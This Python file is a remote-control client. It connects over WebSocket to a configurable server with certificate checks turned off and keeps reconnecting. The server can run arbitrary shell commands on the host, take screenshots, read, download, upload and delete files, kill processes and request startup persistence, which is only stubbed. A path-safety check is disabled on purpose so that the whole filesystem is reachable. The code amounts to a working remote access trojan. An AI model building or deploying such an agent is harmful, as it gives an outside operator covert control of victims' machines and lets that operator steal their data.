import os
import uuid
import time
import base64
import json
import ssl
from pathlib import Path
import socket
import websocket
import subprocess
def is_safe_path(base_path, requested_path):
    # Disable path safety check for cross-platform compatibility
    return True

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import psutil
except ImportError:
    psutil = None

SERVER_URL = "https://127.0.0.1:8444"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8444
CLIENT_ID = None
CLIENT_HOSTNAME = None

def get_hostname():
    try:
        return socket.getfqdn()
    except:
        return "unknown"

def get_websocket_url(svru):
    """构建WebSocket URL"""
    if svru:
        # 处理不同格式的服务器URL
        wss_url = svru.replace("https://", "wss://").replace("http://", "ws://")
        if not wss_url.startswith(("wss://", "ws://")):
            # 如果URL沒有協議前缀，則添加
            wss_url = f"wss://{wss_url.replace('http://', '').replace('https://', '')}"
        return f"{wss_url.rstrip('/')}/ws/"  # 确保路径以 /ws/ 结尾而不附加客户端ID
    return f"wss://127.0.0.1:8444/ws/"

SVR = os.environ.get("SERVER_URL", "https://127.0.0.1:8444")  # 默认服务器URL
WS = get_websocket_url(SVR)

CLIENT_HOSTNAME = os.environ.get("CLIENT_HOSTNAME") or CLIENT_HOSTNAME

# 打印信息时暂时没有ID，因为WS需要在main函数中才能完整确定
print(f"[Client] Server URL: {SVR}")
print(f"[Client] WebSocket URL (template): {WS}<client_id>")
print(f"[Client] Hostname: {CLIENT_HOSTNAME or get_hostname()}")

ID_FILE = Path.home() / ".srt_id"

def get_id():
    if ID_FILE.exists():
        try: return ID_FILE.read_text().strip()
        except: pass
    uid = str(uuid.uuid4().hex[:8])
    try: ID_FILE.write_text(uid)
    except: pass
    return uid

# 获取或生成客户端ID
CID = os.environ.get("CLIENT_ID") or get_id()
print(f"[Client] Client ID: {CID}")

current_dir = os.getcwd()

def run_cmd(cmd):
    import subprocess
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
    return r.stdout or r.stderr or ""

def handle(cmd):
    t, p = cmd.get("type"), cmd.get("payload")
    global current_dir
    if t == "test": return {"status":"ok","result":"OK","result_type":"test"}
    if t == "echo": return {"status":"ok","result":str(p),"result_type":"echo"}
    if t == "time": return {"status":"ok","result":time.strftime("%Y-%m-%d %H:%M:%S"),"result_type":"time"}
    if t == "screenshot"  :
        if not ImageGrab:
            return {"status":"error","result":"ImageGrab module not available","result_type":"error"}
        img = ImageGrab.grab()
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".png",delete=False) as f:
            img.save(f.name)
            data = base64.b64encode(open(f.name,"rb").read()).decode()
        os.remove(f.name)
        return {"status":"ok","result":data,"filename":"shot.png","result_type":"screenshot"}
    if t in ("ls","dir"):
        if p is None or p == '' or p == '.':
            path = current_dir
        else:
            path = os.path.join(current_dir, p)
        
        if not is_safe_path(current_dir, path):
            return {"status":"error","result":"Invalid path","result_type":"error"}
        path = os.path.abspath(path)
        items = os.listdir(path)
        return {"status":"ok","result":items,"result_type":"list"}
    if t == "cat":
        try:
            full_path = os.path.join(current_dir, p) if not os.path.isabs(p) else p
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            with open(full_path,"rb") as f:
                data = base64.b64encode(f.read()).decode()
            return {"status":"ok","result":data,"filename":os.path.basename(full_path),"result_type":"file"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"file"}
    
    if t == "cd":
        try:
            if p is None or p == '.' or p == '':
                return {"status":"ok","result":current_dir,"result_type":"dir"}
            
            new_path = os.path.join(current_dir, p) if not os.path.isabs(p) else p
            # 规范化路径，处理 .. 等相对路径
            new_path = os.path.normpath(new_path)
            
            # 安全路径检查
            if not is_safe_path(current_dir, new_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            
            # 验证目录存在
            if not os.path.exists(new_path):
                return {"status":"error","result":"Directory does not exist","result_type":"error"}
            
            # 验证是目录
            if not os.path.isdir(new_path):
                return {"status":"error","result":"Path is not a directory","result_type":"error"}
            
            # 更新路径
            current_dir = new_path
            
            return {"status":"ok","result":current_dir,"result_type":"dir"}
            
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    
    if t == "pwd":
        return {"status":"ok", "result": current_dir, "result_type":"dir"}
    if t == "dl":
        try:
            path = p.get("path")
            save_as = p.get("save_as", "")
            # 检查是否是分块下载请求
            is_chunked_request = p.get("is_chunked_request", False) 
            range_start = p.get("range_start")
            range_end = p.get("range_end") 
            is_range_request = p.get("is_range_request", False) or p.get("is_chunked_request", False)
            
            if not path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if not os.path.isfile(full_path):
                return {"status":"error","result":"File not found","result_type":"error"}
                
            if (is_chunked_request or is_range_request) and range_start is not None and range_end is not None:
                # 分块请求特定范围的文件内容
                try:
                    with open(full_path, "rb") as f:
                        f.seek(range_start)
                        chunk_data = f.read(range_end - range_start)
                        encoded_chunk = base64.b64encode(chunk_data).decode()
                    
                    result_dict = {
                        "status":"ok",
                        "result":encoded_chunk,
                        "filename":os.path.basename(full_path),
                        "result_type":"file_range"
                    }
                    return result_dict
                except Exception as e:
                    return {"status":"error","result":str(e),"result_type":"error"}
            else:
                # 传输整个文件（传统方式）
                with open(full_path,"rb") as f:
                    data = base64.b64encode(f.read()).decode()
                filename = save_as if save_as else os.path.basename(full_path)
                result_dict = {"status":"ok","result":data,"filename":filename,"result_type":"file"}
                return result_dict
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    elif t == "stream":
        """流式文件传输,用于大文件上传/下载的现代化方法"""
        try:
            path = p.get("path")
            action = p.get("action")
            chunk_index = p.get("chunk_index", 0)
            total_chunks = p.get("total_chunks", 1)
            data = p.get("data", "")
            
            if not path or not action:
                return {"status":"error","result":"Path and action required","result_type":"error"}
                
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            
            if action == "download_start":
                # 开始分块下载文件，获取总大小和块总数
                if not os.path.isfile(full_path):
                    return {"status":"error","result":"File not found","result_type":"error"}
                    
                file_size = os.path.getsize(full_path)
                chunk_size = 1024 * 256  # 256KB 分块
                total_chunks_calc = (file_size + chunk_size - 1) // chunk_size  # 向上取整
                
                return {
                    "status": "ok", 
                    "result": {"file_size": file_size, "chunk_size": chunk_size, "total_chunks": total_chunks_calc},
                    "result_type": "stream_init"
                }
            
            elif action == "download_chunk":
                # 下载指定块
                if not os.path.isfile(full_path):
                    return {"status":"error","result":"File not found","result_type":"error"}
                if total_chunks is None:
                    return {"status":"error","result":"total_chunks must be provided","result_type":"error"}
                if chunk_index >= total_chunks:
                    return {"status":"error","result":"Invalid chunk index","result_type":"error"}
                
                chunk_size = p.get("chunk_size", 1024 * 256)  # 使用指定分块大小或默认值
                
                with open(full_path, "rb") as f:
                    f.seek(chunk_index * chunk_size)
                    chunk_data = f.read(chunk_size)
                    encoded_chunk = base64.b64encode(chunk_data).decode()
                
                return {
                    "status": "ok",
                    "result": {"chunk_data": encoded_chunk, "chunk_index": chunk_index},
                    "result_type": "file_chunk"
                }
            
            elif action == "upload_start":
                # 开始上传准备
                dir_path = os.path.dirname(full_path)
                if dir_path:
                    os.makedirs(dir_path, exist_ok=True)
                # 返回准备状态
                return {"status": "ok", "result": "Ready for upload", "result_type": "stream_ready"}
            
            elif action == "upload_chunk":
                # 接收上传的块
                if not data:
                    return {"status":"error","result":"No data received","result_type":"error"}
                    
                chunk_data = base64.b64decode(data.encode('utf-8'))
                
                # 追加写入文件（对第0块使用覆盖模式，其余块使用追加模式）
                mode = "wb" if chunk_index == 0 else "ab"
                with open(full_path, mode) as f:
                    f.write(chunk_data)
                
                return {
                    "status": "ok", 
                    "result": {"received": len(chunk_data), "chunk_index": chunk_index}, 
                    "result_type": "chunk_ack"
                }
            
            else:
                return {"status":"error","result":"Invalid stream action","result_type":"error"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    elif t == "file":
        try:
            path = p.get("path")
            if not path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if not os.path.exists(full_path):
                return {"status":"error","result":"Path not found","result_type":"error"}
            file_type = "unknown"
            if os.path.isfile(full_path):
                ext = os.path.splitext(full_path)[1].lower()
                if ext in ['.txt', '.md', '.csv', '.json', '.xml', '.ini', '.log']:
                    file_type = "text"
                elif ext in ['.exe', '.bat', '.cmd', '.sh', '.bin', '.dll', '.so', '.dylib']:
                    file_type = "executable"
                elif ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico']:
                    file_type = "image"
                elif ext in ['.pdf']:
                    file_type = "pdf"
                elif ext in ['.mp3', '.wav', '.flac', '.aac']:
                    file_type = "audio"
                elif ext in ['.mp4', '.avi', '.mkv', '.mov']:
                    file_type = "video"
                elif ext in ['.zip', '.tar', '.gz', '.7z', '.rar']:
                    file_type = "archive"
                else:
                    file_type = "file"
            elif os.path.isdir(full_path):
                file_type = "directory"
            elif os.path.islink(full_path):
                file_type = "shortcut"
            return {"status":"ok","result":file_type,"result_type":"file"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t == "stat":
        """获取文件状态信息,主要用于获取文件大小"""
        try:
            path = p.get("path")
            action = p.get("action", "get_info")
            # 检查是否是分块传输请求
            range_start = p.get("range_start")
            range_end = p.get("range_end")
            is_chunked_request = p.get("is_chunked_request")
            
            # 检查是否是在请求分块数据
            if is_chunked_request and range_start is not None and range_end is not None:
                # 表义是在dl命令分块下载时的请求特定范围数据
                full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
                if not os.path.exists(full_path):
                    return {"status":"error","result":"File not found","result_type":"error"}
                if not is_safe_path(current_dir, full_path):
                    return {"status":"error","result":"Invalid path","result_type":"error"}
                
                with open(full_path, "rb") as f:
                    f.seek(range_start)
                    chunk_data = f.read(range_end - range_start)
                    encoded_chunk = base64.b64encode(chunk_data).decode()
                
                return {
                    "status":"ok",
                    "result":encoded_chunk,
                    "filename":os.path.basename(full_path),
                    "result_type":"file_range"
                }
            
            # 正常stat功能
            if not path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            
            if not os.path.exists(full_path):
                return {"status":"error","result":"File not found","result_type":"error"}
                
            if action == "get_size":
                # 直接返回文件大小
                file_size = os.path.getsize(full_path)
                return {"status":"ok","result":str(file_size),"result_type":"file_size"}
            elif action == "get_info":
                # 返回详细文件信息
                stat_info = os.stat(full_path)
                result_dict = {
                    "size": stat_info.st_size,
                    "mtime": stat_info.st_mtime,
                    "atime": stat_info.st_atime, 
                    "ctime": stat_info.st_ctime,
                    "is_file": os.path.isfile(full_path),
                    "is_dir": os.path.isdir(full_path)
                }
                return {"status":"ok","result":result_dict,"result_type":"file_info"}
            else:
                return {"status":"error","result":"Invalid action","result_type":"error"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t == "find":
        try:
            start_path = p.get("path")
            name_pattern = p.get("name")
            file_type = p.get("type")
            if not start_path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, start_path) if not os.path.isabs(start_path) else start_path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if not os.path.exists(full_path):
                return {"status":"error","result":"Start path not found","result_type":"error"}
            results = []
            name_pattern_lower = name_pattern.lower() if name_pattern else None
            for root, dirs, files in os.walk(full_path):
                for name in files:
                    if name_pattern_lower is None or name_pattern_lower in name.lower():
                        full_item = os.path.join(root, name)
                        if file_type is None or file_type == "file":
                            results.append({"path": full_item, "type": "file"})
                if file_type is None or file_type == "dir":
                    for name in dirs:
                        if name_pattern_lower is None or name_pattern_lower in name.lower():
                            full_item = os.path.join(root, name)
                            results.append({"path": full_item, "type": "dir"})
            return {"status":"ok","result":results,"result_type":"list"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t == "file":
        try:
            path = p.get("path")
            if not path:
                return {"status":"error","result":"Path required","result_type":"error"}
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            if not is_safe_path(current_dir, full_path):
                return {"status":"error","result":"Invalid path","result_type":"error"}
            full_path = os.path.abspath(full_path)
            if not os.path.exists(full_path):
                return {"status":"error","result":"Path not found","result_type":"error"}
            file_type = "unknown"
            if os.path.isfile(full_path):
                ext = os.path.splitext(full_path)[1].lower()
                if ext in ['.txt', '.md', '.csv', '.json', '.xml', '.ini', '.log']:
                    file_type = "text"
                elif ext in ['.exe', '.bat', '.cmd', '.sh', '.bin', '.dll', '.so', '.dylib']:
                    file_type = "executable"
                elif ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico']:
                    file_type = "image"
                elif ext in ['.pdf']:
                    file_type = "pdf"
                elif ext in ['.mp3', '.wav', '.flac', '.aac']:
                    file_type = "audio"
                elif ext in ['.mp4', '.avi', '.mkv', '.mov']:
                    file_type = "video"
                elif ext in ['.zip', '.tar', '.gz', '.7z', '.rar']:
                    file_type = "archive"
                else:
                    file_type = "file"
            elif os.path.isdir(full_path):
                file_type = "directory"
            elif os.path.islink(full_path):
                file_type = "shortcut"
            return {"status":"ok","result":file_type,"result_type":"file"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}
    
    if t == "shell":
        try:
            result = subprocess.run(p, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            return {"status": "ok", "result": output, "result_type": "shell"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    if t == "mv":
        try:
            if not isinstance(p, dict) or "from_path" not in p or "to_path" not in p:
                return {"status": "error", "result": "Missing from_path or to_path parameters", "result_type": "error"}
            
            from_path = p.get("from_path")
            to_path = p.get("to_path")
            
            if not from_path or not to_path:
                return {"status": "error", "result": "Both from_path and to_path must be specified", "result_type": "error"}
            
            # 确保路径安全
            full_from = os.path.join(current_dir, from_path) if not os.path.isabs(from_path) else from_path
            full_to = os.path.join(current_dir, to_path) if not os.path.isabs(to_path) else to_path
            
            # 安全路径检查
            if not is_safe_path(current_dir, full_from) or not is_safe_path(current_dir, full_to):
                return {"status": "error", "result": "Invalid path", "result_type": "error"}
            
            full_from = os.path.abspath(full_from)
            full_to = os.path.abspath(full_to)
            
            # 验证源文件或目录存在
            if not os.path.exists(full_from):
                return {"status": "error", "result": f"Source '{from_path}' does not exist", "result_type": "error"}
            
            # 执行移动操作
            import shutil
            if os.path.isdir(full_from):
                if not os.path.exists(os.path.dirname(full_to)):  # 确保目标目录存在
                    os.makedirs(os.path.dirname(full_to), exist_ok=True)
                if os.path.exists(full_to):  # 确保目标路径不存在
                    return {"status": "error", "result": f"Destination '{to_path}' already exists", "result_type": "error"}
                shutil.move(full_from, full_to)
            else:
                # 确保目录存在
                if not os.path.exists(os.path.dirname(full_to)):
                    os.makedirs(os.path.dirname(full_to), exist_ok=True)
                shutil.move(full_from, full_to)
            
            return {"status": "ok", "result": f"Successfully moved '{from_path}' to '{to_path}'", "result_type": "rename"}
        except Exception as e:
            return {"status": "error", "result": f"Failed to move: {str(e)}", "result_type": "error"}

    if t == "ud":
        try:
            if not isinstance(p, dict) or "base64_data" not in p or "save_as" not in p:
                return {"status": "error", "result": "Missing base64_data or save_as parameters", "result_type": "error"}
            
            base64_data = p.get("base64_data")
            save_as = p.get("save_as")
            
            if not base64_data or not save_as:
                return {"status": "error", "result": "Both base64_data and save_as must be specified", "result_type": "error"}
            
            # 确保保存路径安全
            full_save_path = os.path.join(current_dir, save_as) if not os.path.isabs(save_as) else save_as
            
            # 安全路径检查
            if not is_safe_path(current_dir, full_save_path):
                return {"status": "error", "result": "Invalid path", "result_type": "error"}
            
            full_save_path = os.path.abspath(full_save_path)
            
            # 创建必要的目录
            os.makedirs(os.path.dirname(full_save_path), exist_ok=True)
            
            # 解码并写入文件
            file_data = base64.b64decode(base64_data.encode('utf-8'))
            
            with open(full_save_path, 'wb') as f:
                f.write(file_data)
            
            return {"status": "ok", "result": f"File uploaded and saved as '{save_as}'", "result_type": "file_write"}
        except Exception as e:
            return {"status": "error", "result": f"Upload failed: {str(e)}", "result_type": "error"}

    if t == "cp":
        try:
            if not isinstance(p, dict) or "from_path" not in p or "to_path" not in p:
                return {"status": "error", "result": "Missing from_path or to_path parameters", "result_type": "error"}
            
            from_path = p.get("from_path")
            to_path = p.get("to_path")
            
            if not from_path or not to_path:
                return {"status": "error", "result": "Both from_path and to_path must be specified", "result_type": "error"}
            
            # 确保路径安全
            full_from = os.path.join(current_dir, from_path) if not os.path.isabs(from_path) else from_path
            full_to = os.path.join(current_dir, to_path) if not os.path.isabs(to_path) else to_path
            
            # 安全路径检查
            if not is_safe_path(current_dir, full_from) or not is_safe_path(current_dir, full_to):
                return {"status": "error", "result": "Invalid path", "result_type": "error"}
            
            full_from = os.path.abspath(full_from)
            full_to = os.path.abspath(full_to)
            
            # 验证源文件存在
            if not os.path.exists(full_from):
                return {"status": "error", "result": f"Source '{from_path}' does not exist", "result_type": "error"}
            
            if not os.path.isfile(full_from):
                return {"status": "error", "result": f"Source '{from_path}' is not a file", "result_type": "error"}
            
            # 执行复制操作
            import shutil
            dest_dir = os.path.dirname(full_to)
            os.makedirs(dest_dir, exist_ok=True) 
            
            shutil.copy2(full_from, full_to)  # copy2 preserves metadata
            
            return {"status": "ok", "result": f"Successfully copied '{from_path}' to '{to_path}'", "result_type": "copy"}
        except Exception as e:
            return {"status": "error", "result": f"Failed to copy: {str(e)}", "result_type": "error"}

    if t == "rm":
        try:
            # Handle both direct path and structured payload for backward compatibility
            path = None
            recursive = False
            
            if isinstance(p, str):
                # p is the path
                path = p
            elif isinstance(p, dict):
                # structured payload: {"path": "...", "recursive": true/false}
                path = p.get("path")
                recursive = p.get("recursive", False)
            else:
                return {"status": "error", "result": "Expected path string or object", "result_type": "error"}
            
            if not path:
                return {"status": "error", "result": "Path required", "result_type": "error"}
            
            # Normalize path
            full_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
            
            # Safe path check
            if not is_safe_path(current_dir, full_path):
                return {"status": "error", "result": "Invalid path", "result_type": "error"}
            
            full_path = os.path.abspath(full_path)
            
            # Check if file exists
            if not os.path.exists(full_path):
                return {"status": "error", "result": f"Path '{path}' does not exist", "result_type": "error"}
            
            # Import required modules
            import shutil
            
            if os.path.isfile(full_path):
                # Remove file
                os.remove(full_path)
            elif os.path.isdir(full_path):
                if not recursive:
                    return {"status": "error", "result": f"Path '{path}' is a directory, use -r for recursive delete", "result_type": "error"}
                # Remove directory recursively
                shutil.rmtree(full_path)
            else:
                return {"status": "error", "result": f"Path '{path}' is not a file or directory", "result_type": "error"}
            
            operation = "deleted" if os.path.isfile(full_path) else "removed recursively"
            return {"status": "ok", "result": f"Path '{path}' {operation}", "result_type": "remove"}
            
        except PermissionError:
            return {"status": "error", "result": f"Permission denied to remove '{path}'", "result_type": "error"}
        except Exception as e:
            return {"status": "error", "result": f"Failed to remove: {str(e)}", "result_type": "error"}

    if t in ("ps", "process"):
        if not psutil:
            return {"status":"error","result":"psutil module not available","result_type":"error"}
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return {"status":"ok","result":processes,"result_type":"process_list"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t in ("kill", "terminate"):
        if not psutil:
            return {"status":"error","result":"psutil module not available","result_type":"error"}
        pid = None
        try:
            if isinstance(p, dict) and p.get("pid") is not None:
                pid_val = p.get("pid")
                if isinstance(pid_val, str) and pid_val.isdigit():
                    pid = int(pid_val)
                elif isinstance(pid_val, int):
                    pid = int(pid_val)
                else:
                    pid = None
            elif isinstance(p, str) and p.isdigit():
                pid = int(p)
            elif isinstance(p, int):
                pid = p
            else:
                pid = None
            
            if pid is None:
                return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
                
            if not isinstance(pid, int) or pid <= 0:
                return {"status":"error","result":"PID must be a positive integer","result_type":"error"}
            
            proc = psutil.Process(pid)
            proc.terminate()
            proc.wait(timeout=5)
            return {"status": "ok", "result": f"Process {pid} terminated successfully", "result_type": "process_killed"}
        except psutil.NoSuchProcess:
            return {"status":"error","result":f"No process with PID {pid}","result_type":"error"} if pid else {"status":"error","result":"No process with specified PID","result_type":"error"}
        except psutil.AccessDenied:
            return {"status":"error","result":f"Access denied to kill process {pid}","result_type":"error"} if pid else {"status":"error","result":"Access denied to kill process","result_type":"error"}
        except TypeError:
            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
        except ValueError:
            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t in ("kill", "terminate"):
        if not psutil:
            return {"status":"error","result":"psutil module not available","result_type":"error"}
        pid = None
        try:
            if isinstance(p, dict) and p.get("pid") is not None:
                pid_val = p.get("pid")
                if isinstance(pid_val, str) and pid_val.isdigit():
                    pid = int(pid_val)
                elif isinstance(pid_val, int):
                    pid = int(pid_val)
                else:
                    pid = None
            elif isinstance(p, str) and p.isdigit():
                pid = int(p)
            elif isinstance(p, int):
                pid = p
            else:
                pid = None
            
            if pid is None:
                return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
                
            if not isinstance(pid, int) or pid <= 0:
                return {"status":"error","result":"PID must be a positive integer","result_type":"error"}
            
            proc = psutil.Process(pid)
            proc.terminate()
            proc.wait(timeout=5)
            return {"status": "ok", "result": f"Process {pid} terminated successfully", "result_type": "process_killed"}
        except psutil.NoSuchProcess:
            return {"status":"error","result":f"No process with PID {pid}","result_type":"error"} if pid else {"status":"error","result":"No process with specified PID","result_type":"error"}
        except psutil.AccessDenied:
            return {"status":"error","result":f"Access denied to kill process {pid}","result_type":"error"} if pid else {"status":"error","result":"Access denied to kill process","result_type":"error"}
        except TypeError:
            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
        except ValueError:
            return {"status":"error","result":"PID must be a valid integer","result_type":"error"}
        except Exception as e:
            return {"status":"error","result":str(e),"result_type":"error"}

    if t in ("remexec", "remote-exec", "remote-execute"):
        """
        远程执行功能 - 用于系统管理、诊断和故障排除
        远程执行任意Shell命令并返回结果
        """
        try:
            if not p or not isinstance(p, str):
                return {"status": "error", "result": "Shell command required", "result_type": "error"}
            
            # 执行提供的命令
            result = subprocess.run(
                p,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                cwd=current_dir  # 在当前目录下执行
            )
            
            output = result.stdout + result.stderr
            return {
                "status": "ok", 
                "result": output,
                "result_type": "remote_exec"
            }
        except subprocess.TimeoutExpired:
            return {"status": "error", "result": "Command timed out", "result_type": "error"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    if t in ("persist", "install"):
        try:
            if isinstance(p, str):
                # Simple string command: p could be "install" or "remove"
                action = p
                install_path = None
            elif isinstance(p, dict):
                # Structured payload
                action = p.get("action")
                install_path = p.get("path")
            else:
                return {"status": "error", "result": "Expected string or object for persist command", "result_type": "error"}
            
            if action == "install" or action == "auto":
                # Try to install persistent startup item (placeholder implementation)
                # 在实际部署中: 根据操作系统注册到自启动项
                import platform
                
                if platform.system() == "Windows":
                    # For actual implementation, might register in registry or startup folder
                    result_msg = f"Requested persist install on Windows - path: {install_path or 'default location'}"                    
                elif platform.system() == "Linux":
                    # For actual implementation, might create systemd service or autostart desktop file
                    result_msg = f"Requested persist install on Linux - path: {install_path or 'default location'}"
                elif platform.system() == "Darwin":
                    # For actual implementation, might create a LaunchAgent
                    result_msg = f"Requested persist install on macOS - path: {install_path or 'default location'}"
                else:
                    result_msg = f"Requested persist install - OS {platform.system()}, path: {install_path or 'default location'}"
                
                return {"status": "ok", "result": result_msg, "result_type": "persistence_install"}
            
            elif action == "remove":
                import platform
                # For actual implementation, would remove the persistent entry
                if platform.system() == "Windows":
                    result_msg = "Requested persist removal on Windows"
                elif platform.system() == "Linux":
                    result_msg = "Requested persist removal on Linux" 
                elif platform.system() == "Darwin":
                    result_msg = "Requested persist removal on macOS"
                else:
                    result_msg = f"Requested persist removal on {platform.system()}"
                
                return {"status": "ok", "result": result_msg, "result_type": "persistence_remove"}
            
            else:
                return {"status": "error", "result": f"Unknown action '{action}' - use 'install' or 'remove'", "result_type": "error"}
                
        except Exception as e:
            return {"status": "error", "result": f"Failed to manage persistence: {str(e)}", "result_type": "error"}

    return {"status":"error","result":f"Unknown command: {t}","result_type":"unknown"}

def on_msg(ws, msg):
    try:
        msg = json.loads(msg)
        print(f"[Client] Received: {msg}")
        if msg.get("type") == "command":
            payload = msg.get("payload", {})
            print(f"[Client] Processing command: {payload}")
            result = handle(payload)
            print(f"[Client] Result: {result}")
            ws.send(json.dumps({"type":"result","command_id":msg.get("id",""),"result":result}))
            print(f"[Client] Response sent")
    except Exception as e:
        print(f"[Client] Message error: {e}")

def on_error(ws, error):
    print(f"[Client] Error: {error}")

def on_close(ws, close_status_code, close_msg):
    print(f"[Client] Closed: {close_status_code} - {close_msg}")

def on_open(ws):
    hostname = get_hostname()
    print(f"[Client] Connected, registering hostname: {hostname}")
    try:
        ws.send(json.dumps({
            "type": "register",
            "client_id": CID,
            "hostname": hostname,
            "unique_id": get_id()
        }))
        print(f"[Client] Registration successful")
    except Exception as e:
        print(f"[Client] Registration error: {e}")

def main():
    global CID  # 确保使用全局CID变量
    
    print(f"[Client] Starting WebSocket...")
    
    # 获取或生成客户端ID
    CID = os.environ.get("CLIENT_ID") or get_id()
    current_hostname = CLIENT_HOSTNAME or get_hostname()
    
    print(f"[Client] Client ID: {CID} ({current_hostname})")
    
    ws_url = WS + CID  # 确保完整连接地址格式正确
    print(f"[Client] Connecting to {ws_url}...")
    
    ws = websocket.WebSocketApp(
        ws_url,
        on_open=on_open,
        on_message=on_msg,
        on_error=on_error,
        on_close=on_close,
    )
    
    while True:
        try:
            print(f"[Client] Attempting connection to {ws_url}...")
            ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
        except Exception as e:
            print(f"[Client] Run error: {e}")
        print(f"[Client] Retry in 3 seconds...")
        time.sleep(3)

if __name__ == "__main__":
    main()
